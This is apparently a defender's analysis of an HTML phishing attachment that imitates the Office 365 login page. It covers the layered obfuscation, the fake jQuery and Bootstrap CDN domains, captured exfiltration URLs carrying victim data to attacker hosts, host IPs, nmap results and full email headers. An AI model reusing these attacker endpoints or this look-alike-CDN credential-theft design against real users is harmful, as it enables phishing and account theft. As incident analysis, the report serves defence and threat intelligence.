
# HTML Password Phishing Attempt

An email was sent from alan@eatwalkedinburgh.co.uk.

> Email Address:
> - alan@eatwalkedinburgh.co.uk
> - https://haveibeenpwned.com/ shows this email as being breached multiple times
> - scan shows ISP to be 1&1

The email prompts the user to open an attachment which fakes the office 365 login portal in an attempt to get credentials and other information such as IP address, country, datetime, and the location of the attachment on the users system (list of servers the data is sent to is below).

The attachment is an html file that consists of a single script that contains a url encoded html file with css and more javascript. That file that then renders on the screen contains more hidden and nested files in the form of base 64 encoded data urls, obfuscated javascript, and more url encoded html files. Those in return and rendered and fetch multiple javascript payloads from multiple servers.


When active, it sends using an assortment of requests to code.jquery.quest and datplast.com

Sends request: `https://code.jquery.quest/post/index.php?title=Sign%20in%20to%20your%20account&link=file:///C:/Users/USERNAME/Documents/hackattempt.html&time=2022-9-27%208:25:21&ip=192.248.229.37%20:%20United%20States
`

and `https://code.jquery.quest/catch/index.php?dt=1312,5084,1312,2009,2337,2050,1886,2050,2132,2296,1886,2050,2050,2337,1886,2091,2255,1312,2378,1312,3485,4510,4305,4756,4141,4100,1312,3403,4756,3977,4756,4141,4715,1312,2501,2501,2542,1312,1640,1312,3403,4305,4223,4510,1312,4305,4510,1312,4756,4551,1312,4961,4551,4797,4674,1312,3977,4059,4059,4551,4797,4510,4756,1312,1681,1312,2378,1804,4059,4264,4797,4059,4387,2624,4264,4715,4428,4100,3977,1886,4551,4674,4223,1804,3403,4305,4223,4510,1312,4305,4510,1804,4756,4674,4797,4141,1804,3403,4305,4223,4510,1312,2993,4510,410`

The email and password are sent to https://datplast.com/images/V1.3.4.php with every keystroke as soon as the password is at least 6 characters long.


When the page initially loads it imports jquery from multiple hostile sites that include malware payloads:
- https://code.jquery.quest/jquery-3.5.2.min.js
	- This fake jquery file sets global variables used in the obfuscated scripts in the payload and delivers more malicious code at the bottom of the file, beneath legitamte jquery code (line 5721).
	- This script is also run last and therefore overwrites the following scripts which carry similar but slightly different payloads
- https://code.jquery.com.de/jquery-3.5.2.min.js
- https://maxcdn.bootstrapcdn.rest/jquery-3.5.2.min.js
  - The payload in this script uses slightly different obfuscation methods and structure, although the overall form of masking is more or less the same
- https://maxcdn.bootstrapcdn.cloud/jquery-3.5.2.min.js

Other suspicious requests:

- https://i.postimg.cc/jSY8DXQL/back.jpg

list of malware request destinations
'https://code.jquery.quest/ndata/index.php?dt='
'https://code.jquery.quest/tkv/index.php?dt='
'https://code.jquery.com.de/ip.php'
'https://code.jquery.quest/catch/index.php?dt='
'https://code.jquery.quest/post/index.php'
'https://maxcdn.bootstrapcdn.rest/ndata/index.php?dt='
'https://maxcdn.bootstrapcdn.rest/tkv/index.php?dt='
'https://code.jquery.com.de/ip.php'
'https://maxcdn.bootstrapcdn.rest/catch/index.php?dt='
'https://maxcdn.bootstrapcdn.rest/post/index.php'
'https://code.jquery.com.de/ndata/index.php?dt='
'https://code.jquery.com.de/tkv/index.php?dt='
'https://code.jquery.com.de/ip.php'
'https://code.jquery.com.de/catch/index.php?dt='
'https://code.jquery.com.de/post/index.php'
'https://maxcdn.bootstrapcdn.cloud/ndata/index.php?dt='
'https://maxcdn.bootstrapcdn.cloud/tkv/index.php?dt='
'https://code.jquery.com.de/ip.php'
'https://maxcdn.bootstrapcdn.cloud/catch/index.php?dt='
'https://maxcdn.bootstrapcdn.cloud/post/index.php'


## Domains and IPs

```mermaid
graph
    malware -- http --> code.jquery.quest
    malware -- http --> code.jquery.com.de
    malware -- http --> maxcdn.bootstrapcdn.rest
    malware -- http --> maxcdn.bootstrapcdn.cloud
    malware -- http --> datplast.com
    
	  makanagh.com  --> purc.com.gh
	  purc.com.gh -- DNS --> makanagh.com

		code.jquery.quest -- ns1.pinelli90.ml --> code.jquery.quest
		
    code.jquery.com.de -- DNS --> maxcdn.bootstrapcdn.cloud
    code.jquery.com.de -- DNS --> gosselin.consultant.com

    maxcdn.bootstrapcdn.cloud -- DNS --> makanagh.com
    maxcdn.bootstrapcdn.cloud -- DNS --> gosselin.consultant.com
    
```


- code.jquery.com.de
  - 38.34.185.168
- code.jquery.quest
  - 69.49.230.239
- maxcdn.bootstrapcdn.rest
  - 104.21.40.233
  - 172.67.188.128
  - 2606:4700:3034:6815:28df
  - 2606:4700:3034:ac43:bc80
- maxcdn.bootstrapcdn.cloud
  - 162.144.38.214
- makanagh.com
  - 162.144.97.145
- datplast.com
  - 192.185.72.165
- purc.com.gh
  - 142.4.24.11
- gosselin.consultant.com
  - 45.56.79.23

## Encapsulated wireshark scan
---
The script makes connections with the following servers and services as recorded by wireshark:
- 13.35.73.63: AWS
- 68.65.123.205: DNS, namecheap.com
- Akamai Technologies as a CDN
- Cogentco.com (ISP)

> Wireshark capture process used:
> 1. Disconnected VM from Internet
> 2. Started Wireshark capture
> 3. Opened the hslda-policy.html file
> 4. Connected VM to internet
> 5. Disconnected VM from internet
> 6. Closed html fileStopped packet capture

Wireshark scan takeaways:
- Failed SPF, DKIM, etc. because eatwalkedinburgh.co.uk has not implemented email authentication and the message was not signed
- O365 received the email from a mout.kundenserver.de. mrelayeu.kundenserver.de originally received the email from a Ubuntu/Linux loopback IP of 127.0.1.1

## Jquery.quest IP Address and server info
---
An httpx, whois, and nmap scan of this domain retuned the following information:
- URL: https://code.jquery.quest 
- ASN info: AS18978, ENZUINC-, US, 38.34.184.0/23
- IP Address: 38.34.185.163
- Server: Apache
- Website engine: Hugo version 0.98.0
- Domain name registrar: Namecheap
- Domain creation date: 2022-05-08
- Nameservers: NS1.JQUERY.QUEST, NS2.JQUERY.QUEST
- ports available:
	22/tcp   open     ssh
	25/tcp   open     smtp
	53/tcp   open     domain
	80/tcp   open     http
	110/tcp  open     pop3
	111/tcp  open     rpcbind
	143/tcp  open     imap
	443/tcp  open     https
	465/tcp  open     smtps
	587/tcp  open     submission
	646/tcp  filtered ldp
	993/tcp  open     imaps
	995/tcp  open     pop3s
	3306/tcp open     mysql

For info on the rest of the servers, please refer to the the **scans** directory in the zip file.
There is simply too much info for it to be helpful smashed in a single file.

## Related malware
It seems like this report online was of malware from the same group: https://www.joesandbox.com/analysis/725662/0/html

## Email Properties
```
Received: from BN0PR10MB5208.namprd10.prod.outlook.com (::1) by
 CY4PR10MB1814.namprd10.prod.outlook.com with HTTPS; Wed, 21 Sep 2022 08:22:40
 +0000
Received: from MW4PR03CA0234.namprd03.prod.outlook.com (2603:10b6:303:b9::29)
 by BN0PR10MB5208.namprd10.prod.outlook.com (2603:10b6:408:125::16) with
 Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.5654.15; Wed, 21 Sep
 2022 08:22:34 +0000
Received: from CO1NAM11FT093.eop-nam11.prod.protection.outlook.com
 (2603:10b6:303:b9:cafe::1a) by MW4PR03CA0234.outlook.office365.com
 (2603:10b6:303:b9::29) with Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.5654.17 via Frontend
 Transport; Wed, 21 Sep 2022 08:22:34 +0000
Authentication-Results: spf=none (sender IP is 212.227.126.135)
 smtp.mailfrom=eatwalkedinburgh.co.uk; dkim=none (message not signed)
 header.d=none;dmarc=none action=none
 header.from=eatwalkedinburgh.co.uk;compauth=softpass reason=201
Received-SPF: None (protection.outlook.com: eatwalkedinburgh.co.uk does not
 designate permitted sender hosts)
Received: from mout.kundenserver.de (212.227.126.135) by
 CO1NAM11FT093.mail.protection.outlook.com (10.13.175.59) with Microsoft SMTP
 Server (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
 15.20.5654.14 via Frontend Transport; Wed, 21 Sep 2022 08:22:33 +0000
Received: from [127.0.1.1] ([167.99.244.236]) by mrelayeu.kundenserver.de
 (mreue009 [212.227.15.163]) with ESMTPSA (Nemesis) id
 1MkYkI-1ozYqn2MQQ-00m0K8 for <chuck@hslda.org>; Wed, 21 Sep 2022 10:22:31
 +0200
Content-Type: text/plain
MIME-Version: 1.0
Subject: Hslda Benefits-Eligibility for Chuck
From: Hslda<alan@eatwalkedinburgh.co.uk>
To: chuck@hslda.org
Reply-To: <>
X-Priority: 3
Date: Wed, 21 Sep 2022 10:22:31 +0200
Message-ID: <1MAORn-1oPffY2cqB-00Bqcv@mrelayeu.kundenserver.de>
X-Provags-ID: V03:K1:vgGCoVyFoL0q0uzI/AY9JbhL8ch/68RLJQlkhzxGOujAxgpTuET
 4k7wxDGhWQoyLM2HqNbVvVKJj4OgiPvOq1TuBRRtEXmls3R/8bZe2j2/gfRWqAyIZjdJ8JG
 q2+ymOCo+baBJUkSfOoR7Nr5oK3Hr3145CMDvCyrEl4/B4RZtsMulZkEb0ak/D2979YMp2V
 zAgSUwZ6/cFUz/XfOjR8w==
X-Spam-Flag: NO
X-UI-Out-Filterresults: notjunk:1;V03:K0:AQXy5FRd29A=:oKPcOlX3tzWYop/4J7rJOI
 KE49s9DD0w0e+xIWzC1JqI61iwvSY4y+YBH30dLU9K8WWx1FnIbZ8XLhuZ4hjgMZ0lreeekbh
 VbaLRLk/3MDkhqKFuGNxGmGO2KTwX6gbOBMO/uAEZPlCv7nx6YCW/emjl5dxDLL/Vy0rVhha4
 YISN9rLXjdF2XYBuGcqzKjj87Hmj4TbGyYWjaSCkboOMxwR4gpchaJrQbPiZHDADvKqvPdlNA
 TabfW3QgWEHJa/ExdXlfK1g0cFrAqONf22IawDz2S+G36cy2kVYINOIGAkupojsJ17cU9DxtD
 Q5yQM1YntmdmZVPIzmoWUGovZGUTJOrVI4f3DM439CSxwR138DJP4L/kl0ip8wwZiFPNImVJd
 a1/iZadDuE/3PEdg52YC8ZNdf3N6D//W9FuWbmCdoXlsh8R19IDK3QD0pwYBMIxNQ+V74nyZ8
 V/Z8rOyrdNAqcQ5YDOC0Pt3N0H+IIviLB750N5h7PiOOJiNytJleX1hHnfscCWz5q/LOlcel2
 wjRT4nBLC4gui6/FLcy4CpnQ616Ct2GFNDKHqETxLn9FnSMlt30bMWzfIJHDKlHWHWK8fyaRj
 wlhMfEp5lM2VvZxZWiUx2MkPerFkJ5sZ9jTsvJ+8wFSEQQDutNJ6Z+F97i3v6XDLuURFcEpx6
 dFvaLRXEllmawTboMgQpR8tLDxaQEReOHrzLB7q+mpmrY8FW8A/hR+4vA082uU0uSapii98Fg
 1+CwMDBFlkSh/YjwbBSogyu3aV7m5bPyTNG16zf5Mca/lEZfMW6/gq+64iEOTnP+QI5uSkOWJ
 /751sed1g6tPt4Bj9okUICQpO4feMd3gzATe4TYaaFIFJsnUGHin72vTmSvF3DFP6ejcaNbKh
 yNgCFRXicIaNu7yOVg42JNNMqSJFU8lCT3AfVaRRfskmbEQpLpDijMMRcR3New
Return-Path: alan@eatwalkedinburgh.co.uk
X-MS-Exchange-Organization-ExpirationStartTime: 21 Sep 2022 08:22:34.1364

 (UTC)

X-MS-Exchange-Organization-ExpirationStartTimeReason: OriginalSubmit

X-MS-Exchange-Organization-ExpirationInterval: 1:00:00:00.0000000

X-MS-Exchange-Organization-ExpirationIntervalReason: OriginalSubmit

X-MS-Exchange-Organization-Network-Message-Id:

 b5b3cb8c-896e-4853-9144-08da9baa6f5b

X-EOPAttributedMessage: 0

X-EOPTenantAttributedMessage: 60f8196e-33fe-494b-8aab-7e05cdf741bc:0

X-MS-Exchange-Organization-MessageDirectionality: Incoming

X-MS-PublicTrafficType: Email

X-MS-TrafficTypeDiagnostic: CO1NAM11FT093:EE_|BN0PR10MB5208:EE_

X-MS-Exchange-Organization-AuthSource:

 CO1NAM11FT093.eop-nam11.prod.protection.outlook.com

X-MS-Exchange-Organization-AuthAs: Anonymous

X-MS-Office365-Filtering-Correlation-Id: b5b3cb8c-896e-4853-9144-08da9baa6f5b

X-MS-Exchange-Organization-SCL: 1

X-Microsoft-Antispam: BCL:0;

X-Forefront-Antispam-Report:

 CIP:212.227.126.135;CTRY:DE;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:mout.kundenserver.de;PTR:mout.kundenserver.de;CAT:NONE;SFS:(13230022)(932800001)(83770400003)(451199015)(7636003)(7596003)(122186004)(86362001)(356005)(6916009)(3480700007)(336012)(9686003)(33964004)(26005)(83380400001)(79866002)(956004)(58800400005)(5660300002)(8676002)(22186003)(1096003)(137970200004)(47402002)(43540500003);DIR:INB;

X-MS-Exchange-CrossTenant-OriginalArrivalTime: 21 Sep 2022 08:22:33.5739

 (UTC)

X-MS-Exchange-CrossTenant-Network-Message-Id: b5b3cb8c-896e-4853-9144-08da9baa6f5b

X-MS-Exchange-CrossTenant-Id: 60f8196e-33fe-494b-8aab-7e05cdf741bc

X-MS-Exchange-CrossTenant-AuthSource:

 CO1NAM11FT093.eop-nam11.prod.protection.outlook.com

X-MS-Exchange-CrossTenant-AuthAs: Anonymous

X-MS-Exchange-CrossTenant-FromEntityHeader: Internet

X-MS-Exchange-Transport-CrossTenantHeadersStamped: BN0PR10MB5208

X-MS-Exchange-Transport-EndToEndLatency: 00:00:07.1456599

X-MS-Exchange-Processed-By-BccFoldering: 15.20.5654.016

X-Microsoft-Antispam-Mailbox-Delivery:

 ucf:0;jmr:0;auth:0;dest:I;ENG:(910001)(944506478)(944626604)(920097)(930097);

X-Microsoft-Antispam-Message-Info:

 =?us-ascii?Q?Dd+4Kt6fX7PYKX/kSzt7NAuvTkLw/sHuiCTtpjrL9WVKC8jZCS9rz+QeRsUI?=

 =?us-ascii?Q?iWV887IOorWzW/IZ523n9PYAdV/P0OuoCTUdM3zh4klr3O2Q8PPGoACCpPa1?=

 =?us-ascii?Q?a5pxPHqUrMSf/y9G3uUdokaH6XnV60yZFJRfNeXd+mAIrUr/2XAYQIDKPWLL?=

 =?us-ascii?Q?bBA4fePGtQQV76lHdEtgmt2zVK27YZHbY2l5N9gVRg+0p/gk8x4RfvEUIfco?=

 =?us-ascii?Q?+u6PwGvvPvk6+TAmpMn5C9EzJGXSBrarHB4zNGgE7iv67k+278IBsAESdDE9?=

 =?us-ascii?Q?qfTwYeNl8Nraku055G8rCwHEhUmDmnpIqEgTMzjnNDOoCWNNAilXx7D49nV0?=

 =?us-ascii?Q?bhwKdv0vH/u/bH0EuQLVnypfey9Zz4kNatHgrBRR+NAjDdJzuzv9Aj47e3RW?=

 =?us-ascii?Q?t0ayLId5YHgGkc7N5Iv/EJdMiz1J1Hyv+CybeAzYQ/i4beuT1bLSrRHQxIpz?=

 =?us-ascii?Q?Z5gL6t+8FHQtu0RotjBotCr0ho94G3/TN9nqYsjsKj2pi2ZlQej8cvj7loyt?=

 =?us-ascii?Q?IVAI386Akc6kbgG5kXjz0RkM99NC3NoEFfC66ezOLizZoOcb27w7/5yBYuoJ?=

 =?us-ascii?Q?ldS7YtbOy+HpB0x6Ta8+KrZv3IaFtbYo5UoUgK9MHRtcuOjakzmlFUxMNemN?=

 =?us-ascii?Q?KQRW1VMpY7JxVERtPT16cTTy0wY0PuioxCvSESqixSwwwUpxlni0lTUvl2BY?=

 =?us-ascii?Q?HvNADgWngPo7r9lCbBElN2R993GMqATdPPdKaFrQVRSldEVolNdUb9AI1kqP?=

 =?us-ascii?Q?wAEs0we/eneIN+Audue4SwFWPar23xngbI+AEZQ5QL+YflWxAfijdxexSSh7?=

 =?us-ascii?Q?VFls2TYGRk/p4F1aLNwgQBPjEZRxuyBZ+ilMIGB1lyG9SHCF1AReIjpVeOEh?=

 =?us-ascii?Q?CZhcNkCFFYz297EX4dXrzDHZkzCvEIGUJzaVFVVxb3UOg2sCJM6hvzgfyeKu?=

 =?us-ascii?Q?fopd2iNc+aIyAoanpW4enrseQqPm7Q5nhSQ2C2w0BxSNsDPlBWhilcVVNF10?=

 =?us-ascii?Q?LHpyMTiNuki2oZh4ajEizhuDIQJw8LPmM4CBwyr7i5RFraJ24w5r0Tkus3gM?=

 =?us-ascii?Q?Cpgh409h83NSfwRbJQXK29a5Y3AHqKM+5gDk3aYstNoHCoDUQA87wTKgMeNI?=

 =?us-ascii?Q?gU6LEcwbrYeblDnDDQ4tkyeqrTHopUaSwg6+863NxAoPh2nQslwRtLnoWnvw?=

 =?us-ascii?Q?fq+vyJ4TmLgKue+jQjtWtu8J0ptczZGzxzsBu0d4JwifQc7teT8cJiRpvute?=

 =?us-ascii?Q?5dWqzmeQcS9Rw66Fmr6JLoeddetqhntWFWRAsfFPv4SR+RTNeQky8n+9iNvz?=

 =?us-ascii?Q?8YiS7YFphdrbPK2zRrdWhG71Kv43/EoCqb6uT23OIPwxhuRU6MIyg4QyZNNy?=

 =?us-ascii?Q?E3cWcTCLeZKs2lLPhww0IDR9EnPxGwrClAbPHJlHwW6B+GOCwEJoPSXhpBw+?=

 =?us-ascii?Q?Pn/IEuXGjoEzIZvfsWZvgGwFfxs/UDtFgs1R+vtMDFcnKISXgmRoBpLG67TI?=

 =?us-ascii?Q?neN2UN9vrdhMDfbS2Q+G+CTAw4sRONMNPVE6fQhZOdA/eUOTUJcEMCNYlcxH?=

 =?us-ascii?Q?jZeGicROX8v2rEg9qfvaiV6jvLi6hYcE8FitRlxixUsl0ZgTDx6GDRh2vQbf?=

 =?us-ascii?Q?j2SBu+zNV0OU4RGMeSdJiyTQv0WZQlYDMLGFDEB7XfuCq+SwBZO4VtWUM3sF?=

 =?us-ascii?Q?Tex5HHp1bCPgIFdFnJ/smGianIBIpwttx+aIqf7kgeDnGU3u5UsBW7aWyCON?=

 =?us-ascii?Q?MR3vNEUHS+4825+ho7NF7QmmYjWI2urqkIunZIkrlJygbYC7UUtg?=

X-Microsoft-Antispam-ZAP-Message-Info:

    izDNZql2hV+bhVgDcaVxOcyvAcRHJVwdUPTB0zzgolJdvTK4LXXGYe/ifTw/TKOKOT9MexDSwGmMb1vRIPWsNLvdY6lw3HPMmOrlmc9ea5N2J79ItnerIMW0WKvg2LhxqAqZThVOzJOcyyiWcgx23M+U48RIILnfFY/N+Q7Pnwn2NSh45HPiqzxYp5SWDuflSm77TF579rjUwJcLWcLPBok9EytOY4/1QFDDWUleyeT6QMNirHb6ifrwLSTMklKrrcCxBG6X44TqgINnxi2FttyIt9jfeF8I5WpaxbG8Rv1Nw9wHOjhxCy+T7BWFW+ZlN5zx6HDuaj135SFHRR758PY7BuJXmykt/hxDBO/0B3AWR0iR/c3yxPqlN34SWLoUG6soZLSHggFErSLxQremZiEXAKvv/JI6AQnbB//U1bAxBNkPotKGSI5K5PPIT2LOj6xd7HcQlqsxBoiqUs3QiOQGNKJ/a/GLlL5KjvGhRxs7cGl2CwUKxensFFxygruBWwq/HUEFcvsxgH0AumaKQo0lfKXAbFpegJnUXNalUPFRhNIbPXetR0EC+J0UH80JACPZqqELgItgOGFRFqweTbbLJ8D4HS/6VoDeE5qeC/uMX0qsNSB7FQj/ILp+/xiO1jqYYGphUK0FGSGBQMIWmq6si5xv/2d2JdfOXnKL1QVMEIwr4KswYjRN9t5D59gn7u5DqBeFLzKHWsGC8JveH5V0PCeQlwRxw/QFZJIkE6jc3dAjd1ihRWhKRXVidpsfvQAQaAT4kPTAw8On2ZoyxQUrWbWgGbjmqk4vsy2WMTmmN+KzfG9VixIVU+2J66hbqYZJjrG66BXiHI9FuYoMDA=
```

